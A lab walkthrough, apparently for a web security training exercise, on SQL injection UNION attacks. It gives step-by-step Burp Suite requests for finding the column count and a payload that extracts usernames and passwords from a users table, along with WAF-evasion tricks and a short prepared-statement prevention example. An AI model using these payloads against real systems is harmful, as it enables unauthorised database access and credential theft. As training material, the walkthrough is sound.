# SQL injection Lab3 : UNION Attack Determining Columns

# Objective
    Determine the number of columns in a SQL query using UNION attacks to extract data from other tables.

# Burp Suite
    1.Configure Burp Suite proxy (127.0.0.1:8080)
    2.Access the lab URL and browse to the vulnerable category page
    3.Observe the normal request:
              GET /filter?category=Gifts HTTP/1.1

     4.Identify Injection Point
         Capture the request in Burp and send to Repeater (Right-click → Send to Repeater)
     5.Test Column Count Using ORDER BY
          GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1

          ORDER BY 2--
          ORDER BY 3-- 
          ORDER BY 4--  ← This fails (3 columns total)
    6.Confirm with UNION SELECT
          GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
    7.Find string-compatible columns:
          GET /filter?category=Gifts' UNION SELECT 'a','b','c'-- HTTP/1.1
    8.Extract data (example for 3 columns):
          GET /filter?category=Gifts' UNION SELECT username,password,NULL FROM users-- HTTP/1.1
  # Tips 
      Send request to Intruder
              Set payload position: ORDER BY §1§--
              Use number payloads (1-10)
              Grep for "Internal Server Error"
      Encoding Tricks:
              Use %20 for spaces if needed
              Try + as space alternative in URL
      Response Analysis:
              500 error = incorrect column count
              200 with extra data = success

# Perevention
  String query = "SELECT * FROM products WHERE category = ?";
  PreparedStatement stmt = connection.prepareStatement(query);
  stmt.setString(1, category);

# Key
    Technique: UNION attack vs simple injection
    Complexity: Requires multiple test requests
    Outcome: Data extraction vs simple bypass

# Troubleshooting 
    Try different NULL combinations: NULL,NULL--
    Test with explicit column types: 'a',123,NULL--
    Verify you're seeing the UNION results in response
    Check for WAF blocks (try adding comments between keywords)

# Common Errors
  "No results" after UNION:
       - Try `UNION ALL SELECT` instead
       - Ensure same data types in columns

    WAF blocking:
       - Add comments between keywords: `UN/**/ION SEL/**/ECT`
       - Use mixed case: `UnIoN SeLeCt`
